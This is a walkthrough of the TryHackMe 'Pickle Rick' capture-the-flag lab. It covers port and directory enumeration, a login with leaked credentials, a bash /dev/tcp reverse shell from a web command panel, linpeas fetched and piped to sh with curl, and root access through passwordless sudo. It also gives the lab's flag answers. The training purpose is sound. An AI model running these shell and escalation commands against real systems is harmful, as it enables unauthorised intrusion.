# Pickle Rick CTF
This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle.

## Port Enumeration

We begin by performing a port scan on the top 1000 commons ports using nmap. 

```
nmap --top-ports 1000 -sV -sC -oN nmap-results-scripts.txt <IP>
```

The results from the port scan are:

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-02 02:21 EDT
Stats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 30.87% done; ETC: 02:22 (0:00:09 remaining)
Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 39.00% done; ETC: 02:22 (0:00:11 remaining)
Nmap scan report for 10.10.231.239
Host is up (0.32s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f0:33:dd:5a:a8:1a:62:8f:c6:e5:25:86:69:09:de:98 (RSA)
|   256 57:49:75:0d:1c:30:ac:d4:21:34:61:8f:00:bd:71:0b (ECDSA)
|_  256 6e:65:56:be:0c:57:d4:5f:92:d9:e8:2b:3a:f0:50:5c (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.31 seconds

```

We can see there are two services running, an Apache web service running on port 80 and OpenSSH running on port 22. 


## Website enumeration

Turning our attention to the website. 

Inspecting the source of the landing page.

```
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Rick is sup4r cool</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="assets/bootstrap.min.css">
  <script src="assets/jquery.min.js"></script>
  <script src="assets/bootstrap.min.js"></script>
  <style>
  .jumbotron {
    background-image: url("assets/rickandmorty.jpeg");
    background-size: cover;
    height: 340px;
  }
  </style>
</head>
<body>

  <div class="container">
    <div class="jumbotron"></div>
    <h1>Help Morty!</h1></br>
    <p>Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!</p></br>
    <p>I need you to <b>*BURRRP*</b>....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is,
    I have no idea what the <b>*BURRRRRRRRP*</b>, password was! Help Morty, Help!</p></br>
  </div>

  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->

</body>
</html>
```

This gives us two useful bits of information. 
1. Ricks username is `R1ckRul3s`
2. The website uses php, as indicated by the `<script src="assets/jquery.min.js"></script>`

Armed with this knowledge, lets enumerate the website using ffuf and checking for .php extensions along with the standard extensions performed by ffuf by default. 

```
ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://<IP>/FUZZ -e .php
```

We get the following results:

```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.231.239/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

.htaccess.php           [Status: 403, Size: 301, Words: 22, Lines: 12, Duration: 326ms]
.htpasswd.php           [Status: 403, Size: 301, Words: 22, Lines: 12, Duration: 327ms]
.htaccess               [Status: 403, Size: 297, Words: 22, Lines: 12, Duration: 3695ms]
.htpasswd               [Status: 403, Size: 297, Words: 22, Lines: 12, Duration: 4691ms]
assets                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 354ms]
denied.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 395ms]
login.php               [Status: 200, Size: 882, Words: 89, Lines: 26, Duration: 340ms]
portal.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 318ms]
robots.txt              [Status: 200, Size: 17, Words: 1, Lines: 2, Duration: 317ms]
server-status           [Status: 403, Size: 301, Words: 22, Lines: 12, Duration: 332ms]
:: Progress: [40938/40938] :: Job [1/1] :: 121 req/sec :: Duration: [0:05:44] :: Errors: 0 ::
```

`robots.txt`, `assets`, `portal.php` and `login.php` are interesting places to visit.

Checking `robots.txt` we find a text `Wubbalubbadubdub`


Checking `assets` we find a list of the following assets on the website. 

```
Index of /assets
[ICO]	Name	Last modified	Size	Description
	    Parent Directory	 	-	 
[TXT]	bootstrap.min.css	2019-02-10 16:37	119K	 
[   ]	bootstrap.min.js	2019-02-10 16:37	37K	 
[IMG]	fail.gif	2019-02-10 16:37	49K	 
[   ]	jquery.min.js	2019-02-10 16:37	85K	 
[IMG]	picklerick.gif	2019-02-10 16:37	222K	 
[IMG]	portal.jpg	2019-02-10 16:37	50K	 
[IMG]	rickandmorty.jpeg	2019-02-10 16:37	488K	 
Apache/2.4.18 (Ubuntu) Server at 10-10-231-239.p.thmlabs.com Port 80
```

Inspecting the different assets we don't find anything interesting. 

Checking `portal.php`, it redirects us to `login.php`

## login.php

Navigating to `https://<IP>.p.thmlabs.com/login.php` we're presented with a prompt for a username and password. 

We know the username `R1ckRul3s` and the only other piece of information we've found is the text `Wubbalubbadubdub` from `robots.txt`. Trying those as the username and password respectively works and logs us in. 

```
Username = R1ckRul3s

Password = Wubbalubbadubdub
```

Once logged in we're presented with a Command Panel and various other tabs for the website. 

CLicking on the other tabs shows that permission is denied. We appear to only have access to the Command Panel.

Lets try to execute a basic linux command, typing `ls` and clicking execute reveals the contents of the directory. 

```
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

Lets try and `cat` out the `Sup3rS3cretPickl3Ingred.txt`.

```
Command disabled to make it hard for future PICKLEEEE RICCCKKKK.
```

Annoyingly the command panel is blocking `cat`. 

Lets try a reverse bash shell. First set up a netcat listener on your machine. 

```
nc -lvp 4242
```

Now lets execute the reverse bash shell on the Command Panel

```
bash -c 'exec bash -i &>/dev/tcp/<YOUR-IP>/4242 <&1'
```

This has worked and we now have a shell on the target. 

```
┌──(kali㉿kali)-[~/Documents/picklerick]
└─$ nc -lvp 4242    
listening on [any] 4242 ...
10.10.132.138: inverse host lookup failed: Unknown host
connect to [10.9.0.67] from (UNKNOWN) [10.10.132.138] 56874
bash: cannot set terminal process group (1349): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-10-132-138:/var/www/html$
```

## www-data 

We our reverse shell, we start by listing the directory. 

```
www-data@ip-10-10-132-138:/var/www/html$ ls
ls
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```
Lets try and `cat` out the `Sup3rS3cretPickl3Ingred.txt` again. 

```
www-data@ip-10-10-132-138:/var/www/html$ cat Sup3rS3cretPickl3Ingred.txt
cat Sup3rS3cretPickl3Ingred.txt
mr. meeseek hair
```

Success, we've found our first ingredient. 

## Second Ingredient

Now we need to find the second and third ingredients. 

There is a `clue.txt` in the base directory.

```
www-data@ip-10-10-132-138:/var/www/html$ cat clue.txt
cat clue.txt
Look around the file system for the other ingredient.
```

Taking the advice, lets navigate to `/home/` and see what other user directories exist. 

```
www-data@ip-10-10-132-138:/var/www/html$ cd /home/
cd /home/
www-data@ip-10-10-132-138:/home$ ls -al
ls -al
total 16
drwxr-xr-x  4 root   root   4096 Feb 10  2019 .
drwxr-xr-x 23 root   root   4096 Sep  2 23:31 ..
drwxrwxrwx  2 root   root   4096 Feb 10  2019 rick
drwxr-xr-x  4 ubuntu ubuntu 4096 Feb 10  2019 ubuntu
```

We can see a `rick` user directory with wide open permissions. 

Navigating to the `rick` directory and listing what it contains we find a `second ingredients` file.

```
www-data@ip-10-10-132-138:/home/rick$ cd /home/rick
cd /home/rick
www-data@ip-10-10-132-138:/home/rick$ ls -al
ls -al
total 12
drwxrwxrwx 2 root root 4096 Feb 10  2019 .
drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients

```

Lets cat out the contents of `second ingredients`. Note the use of `'` quotes because the file contains a space in it.

```
www-data@ip-10-10-132-138:/home/rick$ cat 'second ingredients'
cat 'second ingredients'
1 jerry tear
```

We have our second ingredient!

## Third ingredient

Now to find the third ingredient. Lets check the `root` home directory, a typical place of interest. 

```
www-data@ip-10-10-132-138:/$ ls -al /root
ls -al /root
ls: cannot open directory '/root': Permission denied
```

We don't have access as this user. Lets try and find a way to escalate privileges. 

Lets upload linpeas and to find privesc opportunities. 

On your local machine, navigate to where the `linpeas.sh` script is. If installed on Kali it typically lives at `/usr/share/peass`. If not installed, linpeas can be installed by `apt install peass` or obtained from https://github.com/carlospolop/PEASS-ng.

Once at the directory where linpeas.sh is. Lets run a basic web server using python to serve up the files in the directory.

```
sudo python3 -m http.server --bind <YOUR-IP> 8000
```

Now on the victim, use curl to download the linpeas.sh script and pipe it straight to shell to run. 

```
curl 10.9.0.67:8000/linpeas.sh | sh
```

Reviewing the linpeas output, we not the following interesting results.

```
╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034                                                                                   

sh: 1197: [[: not found
sh: 1197: rpm: not found
sh: 1197: 0: not found
sh: 1207: [[: not found

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                              
Matching Defaults entries for www-data on ip-10-10-132-138.eu-west-1.compute.internal:                        
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-132-138.eu-west-1.compute.internal:
    (ALL) NOPASSWD: AL

```

This machine is vulnerable to CVE-2021-4034. This is trivial to exploit using metasploit, but likely not the intended way of gaining root on the CTF so we will look for other ways. 

The sudoers permissions tells us the user `www-data` may run sudo with no password. Armed with this knowledge we should be able to simple change the access permissions of the root directory. 

```
www-data@ip-10-10-132-138:/$ sudo chmod 777 /root
sudo chmod 777 /root

www-data@ip-10-10-132-138:/$ cd /root
cd /root

www-data@ip-10-10-132-138:/root$ ls -al
ls -al
total 28
drwxrwxrwx  4 root root 4096 Feb 10  2019 .
drwxr-xr-x 23 root root 4096 Sep  2 23:31 ..
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Feb 10  2019 .ssh
-rw-r--r--  1 root root   29 Feb 10  2019 3rd.txt
drwxr-xr-x  3 root root 4096 Feb 10  2019 snap
```

Success, using sudo we've opened up `/root` to all users and can list its content. 

Here we see a `3rd.txt`, lets cat out its content. 

```
www-data@ip-10-10-132-138:/root$ cat 3rd.txt
cat 3rd.txt
3rd ingredients: fleeb juice
```

We have the third ingredient, success!